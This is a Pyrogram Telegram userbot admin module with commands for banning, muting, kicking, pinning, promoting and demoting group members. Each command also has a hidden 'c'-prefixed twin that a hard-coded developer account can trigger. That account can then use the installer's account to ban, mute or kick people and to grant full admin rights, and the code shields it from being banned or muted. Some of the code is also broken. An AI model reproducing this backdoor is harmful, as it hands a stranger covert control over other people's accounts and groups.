import asyncio
DEVS = int(6154979500)
from pyrogram import Client, filters
from pyrogram.errors import ChatAdminRequired
from pyrogram.types import ChatPermissions, ChatPrivileges, Message
from Anonymous.modules.help.basic import edit_or_reply
from Anonymous.modules.help import add_help_cmd
from Anonymous.helper.misc import extract_user, extract_user_and_reason, list_admins

unmute_permissions = ChatPermissions(
    can_send_messages=True,
    can_send_media_messages=True,
    can_send_polls=True,
    can_change_info=False,
    can_invite_users=True,
    can_pin_messages=False,
)


@Client.on_message(filters.group & filters.command(["setchatphoto", "setgpic"], ".") & filters.me)
async def set_chat_photo(client: Client, message: Message):
    zuzu = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    can_change_admin = zuzu.can_change_info
    can_change_member = message.chat.permissions.can_change_info
    if not (can_change_admin or can_change_member):
        await message.edit_text("You don't have enough permission")
    if message.reply_to_message:
        if message.reply_to_message.photo:
            await client.set_chat_photo(
                message.chat.id, photo=message.reply_to_message.photo.file_id
            )
            return
    else:
        await message.edit_text("Reply to a photo to set it !")


@Client.on_message(
    filters.group & filters.command("cban", ".") & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.group & filters.command("ban", ".") & filters.me)
async def member_ban(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
    Man = await edit_or_reply(message, "`Processing...`")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("I don't have enough permissions")
    if not user_id:
        return await Man.edit("I can't find that user.")
    if user_id == client.me.id:
        return await Man.edit("I can't ban myself.")
    if user_id in DEVS:
        return await Man.edit("I can't ban my developer!")
    if user_id in (await list_admins(client, message.chat.id)):
        return await Man.edit("I can't ban an admin, You know the rules, so do i.")
    try:
        mention = (await client.get_users(user_id)).mention
    except IndexError:
        mention = (
            message.reply_to_message.sender_chat.title
            if message.reply_to_message
            else "Anon"
        )
    msg = (
        f"**Banned User:** {mention}\n"
        f"**Banned By:** {message.from_user.mention if message.from_user else 'Anon'}\n"
    )
    if message.command[0][0] == "d":
        await message.reply_to_message.delete()
    if reason:
        msg += f"**Reason:** {reason}"
    await message.chat.ban_member(user_id)
    await Man.edit(msg)


@Client.on_message(filters.command("cunban", ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.group & filters.command("unban", ".") & filters.me)
async def member_unban(client: Client, message: Message):
    reply = message.reply_to_message
    Man = await edit_or_reply(message, "`Processing...`")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("I don't have enough permissions")
    if reply and reply.sender_chat and reply.sender_chat != message.chat.id:
        return await Man.edit("You cannot unban a channel")

    if len(message.command) == 2:
        user = message.text.split(None, 1)[1]
    elif len(message.command) == 1 and reply:
        user = message.reply_to_message.from_user.id
    else:
        return await Man.edit(
            "Provide a username or reply to a user's message to unban."
        )
    await message.chat.unban_member(user)
    umention = (await cleint.get_users(user)).mention
    await Man.edit(f"Unbanned! {umention}")


@Client.on_message(
    filters.command(["cpin", "cunpin"], ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["pin", "unpin"], ".") & filters.me)
async def pin_message(client: Client, message):
    if not message.reply_to_message:
        return await edit_or_reply(message, "Reply to a message to pin/unpin it.")
    Man = await edit_or_reply(message, "`Processing...`")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_pin_messages:
        return await Man.edit("I don't have enough permissions")
    r = message.reply_to_message
    if message.command[0][0] == "u":
        await r.unpin()
        return await Man.edit(
            f"**Unpinned [this]({r.link}) message.**",
            disable_web_page_preview=True,
        )
    await r.pin(disable_notification=True)
    await Man.edit(
        f"**Pinned [this]({r.link}) message.**",
        disable_web_page_preview=True,
    )


@Client.on_message(filters.command(["cmute"], ["."]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command("mute", ".") & filters.me)
async def mute(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    Man = await edit_or_reply(message, "`Processing...`")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("I don't have enough permissions")
    if not user_id:
        return await Man.edit("I can't find that user.")
    if user_id == client.me.id:
        return await Man.edit("I can't mute myself.")
    if user_id in DEVS:
        return await Man.edit("I can't mute my developer!")
    if user_id in (await list_admins(client, message.chat.id)):
        return await Man.edit("I can't mute an admin, You know the rules, so do i.")
    mention = (await client.get_users(user_id)).mention
    msg = (
        f"**Muted User:** {mention}\n"
        f"**Muted By:** {message.from_user.mention if message.from_user else 'Anon'}\n"
    )
    if reason:
        msg += f"**Reason:** {reason}"
    await message.chat.restrict_member(user_id, permissions=ChatPermissions())
    await Man.edit(msg)


@Client.on_message(
    filters.command(["cunmute"], ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.group & filters.command("unmute", ".") & filters.me)
async def unmute(client: Client, message: Message):
    user_id = await extract_user(message)
    Man = await edit_or_reply(message, "`Processing...`")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("I don't have enough permissions")
    if not user_id:
        return await Man.edit("I can't find that user.")
    await message.chat.restrict_member(user_id, permissions=unmute_permissions)
    umention = (await client.get_users(user_id)).mention
    await Man.edit(f"Unmuted! {umention}")


@Client.on_message(
    filters.command(["ckick", "cdkick"], ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["kick", "dkick"], ".") & filters.me)
async def kick_user(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    Man = await edit_or_reply(message, "`Processing...`")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("I don't have enough permissions")
    if not user_id:
        return await Man.edit("I can't find that user.")
    if user_id == client.me.id:
        return await Man.edit("I can't kick myself.")
    if user_id == DEVS:
        return await Man.edit("I can't kick my developer.")
    if user_id in (await list_admins(client, message.chat.id)):
        return await Man.edit("I can't kick an admin, You know the rules, so do i.")
    mention = (await client.get_users(user_id)).mention
    msg = f"""
**Kicked User:** {mention}
**Kicked By:** {message.from_user.mention if message.from_user else 'Anon'}"""
    if message.command[0][0] == "d":
        await message.reply_to_message.delete()
    if reason:
        msg += f"\n**Reason:** `{reason}`"
    try:
        await message.chat.ban_member(user_id)
        await Man.edit(msg)
        await asyncio.sleep(1)
        await message.chat.unban_member(user_id)
    except ChatAdminRequired:
        return await Man.edit("**Reee ! I'm not admin**")


@Client.on_message(
    filters.group
    & filters.command(["cpromote", "cfullpromote"], ["."])
    & filters.user(DEVS)
    & ~filters.me
)
@Client.on_message(
    filters.group & filters.command(["promote", "fullpromote"], ".") & filters.me
)
async def promotte(client: Client, message: Message):
    user_id = await extract_user(message)
    umention = (await client.get_users(user_id)).mention
    Man = await edit_or_reply(message, "`Processing...`")
    if not user_id:
        return await Man.edit("I can't find that user.")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_promote_members:
        return await Man.edit("I don't have enough permissions")
    if message.command[0][0] == "f":
        await message.chat.promote_member(
            user_id,
            privileges=ChatPrivileges(
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_promote_members=True,
            ),
        )
        return await Man.edit(f"Fully Promoted! {umention}")

    await message.chat.promote_member(
        user_id,
        privileges=ChatPrivileges(
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_promote_members=False,
        ),
    )
    await Man.edit(f"Promoted! {umention}")


@Client.on_message(
    filters.group
    & filters.command(["cdemote"], ["."])
    & filters.user(DEVS)
    & ~filters.me
)
@Client.on_message(filters.group & filters.command("demote", ".") & filters.me)
async def demote(client: Client, message: Message):
    user_id = await extract_user(message)
    Man = await edit_or_reply(message, "`Processing...`")
    if not user_id:
        return await Man.edit("I can't find that user.")
    if user_id == client.me.id:
        return await Man.edit("I can't demote myself.")
    await message.chat.promote_member(
        user_id,
        privileges=ChatPrivileges(
            can_manage_chat=False,
            can_delete_messages=False,
            can_manage_video_chats=False,
            can_restrict_members=False,
            can_change_info=False,
            can_invite_users=False,
            can_pin_messages=False,
            can_promote_members=False,
        ),
    )
    umention = (await client.get_users(user_id)).mention
    await Man.edit(f"Demoted! {umention}")


add_help_cmd(
    "admin",
    [
        [".ban <reply/username/userid> <reason>", "To ban a member from chat."],
        [
            ".unban <reply/username/userid> <reason>",
            "To unban member from chat.",
        ],
        [".kick <reply/username/userid>", "To simply kick an user."],
        [
            ".promote atau .fullpromote",
            "To promote an user.",
        ],
        [".demote", "To demote an admin."],
        [
            ".mute <reply/username/userid>",
            "To mute an user.",
        ],
        [
            ".unmute <reply/username/userid>",
            "To unmute an user.",
        ],
        [
            ".pin <reply>",
            "To pin something in chat.",
        ],
        [
            ".unpin <reply>",
            "To unpin pinned message.",
        ],
        [
            ".setgpic <reply ke foto>",
            "To set group pic",
        ],
    ],
)
